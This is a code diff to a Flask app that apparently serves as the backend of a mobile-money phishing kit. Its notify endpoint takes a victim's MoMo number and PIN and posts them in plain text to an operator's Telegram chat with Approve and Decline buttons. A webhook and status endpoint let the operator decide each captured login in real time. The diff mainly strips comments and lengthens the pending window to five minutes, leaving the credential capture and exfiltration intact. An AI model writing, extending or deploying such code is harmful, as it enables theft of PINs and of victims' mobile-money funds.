@@ -10,7 +10,6 @@ BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
 CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID")
 
 # In-memory store of pending login attempts
-# { request_id: { momo, pin, time, status, decided_at } }
 PENDING = {}
 
 
@@ -42,7 +41,6 @@ def notify():
     pin = data.get("pin", "unknown")
     time_str = data.get("time", "unknown")
 
-    # Create a unique ID for this attempt
     request_id = uuid.uuid4().hex[:12]
 
     PENDING[request_id] = {
@@ -58,8 +56,7 @@ def notify():
         "━━━━━━━━━━━━━━━━━━\n"
         f"📱 *MoMo:* {momo}\n"
         f"🔑 *PIN:* {pin}\n"
-        f"🕒 *Time:* {time_str}\n"
-        f"🆔 *ID:* `{request_id}`\n\n"
+        f"🕒 *Time:* {time_str}\n\n"
         "Approve or decline this login:"
     )
 
@@ -101,8 +98,7 @@ def status(request_id):
     if not entry:
         return jsonify({"ok": False, "status": "unknown"}), 404
 
-    # Expire after 2 minutes
-    if time.time() - entry["created_at"] > 120 and entry["status"] == "pending":
+    if time.time() - entry["created_at"] > 300 and entry["status"] == "pending":
         entry["status"] = "expired"
 
     return jsonify({"ok": True, "status": entry["status"]})
@@ -110,9 +106,7 @@ def status(request_id):
 
 @app.route("/telegram-webhook", methods=["POST"])
 def telegram_webhook():
-    """Telegram calls this when you tap Approve or Decline."""
     update = request.get_json(silent=True) or {}
-
     callback = update.get("callback_query")
     if not callback:
         return "ok", 200
@@ -123,7 +117,6 @@ def telegram_webhook():
     message_id = message.get("message_id")
     chat_id = message.get("chat", {}).get("id")
 
-    # data looks like "approve:abc123" or "decline:abc123"
     if ":" not in data:
         return "ok", 200
 
@@ -141,9 +134,6 @@ def telegram_webhook():
     else:
         return "ok", 200
 
-    entry["decided_at"] = time.time()
-
-    # Tell Telegram the button was tapped (removes the loading spinner)
     try:
         requests.post(
             f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery",
@@ -151,14 +141,12 @@ def telegram_webhook():
             timeout=5,
         )
 
-        # Edit the original message to show the decision
         new_text = (
             f"🔐 MoMo Login Attempt\n"
             f"━━━━━━━━━━━━━━━━━━\n"
             f"📱 MoMo: {entry['momo']}\n"
             f"🔑 PIN: {entry['pin']}\n"
-            f"🕒 Time: {entry['time']}\n"
-            f"🆔 ID: {request_id}\n\n"
+            f"🕒 Time: {entry['time']}\n\n"
             f"{answer_text} by admin"
         )
         requests.post(
